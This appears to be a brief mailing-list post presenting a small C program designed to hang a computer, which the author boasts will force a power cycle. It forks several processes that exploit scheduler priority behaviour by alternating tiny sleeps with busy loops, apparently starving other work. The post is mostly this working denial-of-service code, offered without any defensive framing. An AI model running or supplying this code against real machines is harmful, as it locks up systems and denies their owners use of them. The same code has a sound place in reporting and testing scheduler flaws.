The previous code was a mistake. (Calling clock() before sleeping is quite dumb...)
Here is another one.  If you put the right value in MHZ, (maybe more, maybe less, I dunno),
I bet you won't get out without power cycling your box...
#include <unistd.h>
#define MHZ 450 /* Your CPU Mhz */
#define COUNT (MHZ * 1000)
#define PRIO_LEVELS 10
int main(void)
{
    int i;
    fork();
    fork();
    /* Climb all priority levels. */
    for (i = 0; i < PRIO_LEVELS; i++)
        usleep(1);
    for (;;) {
        usleep(1); /* get one point. */
        for (i = 0; i < COUNT; i++); /* lose one point. */
    }
    return 0;
}
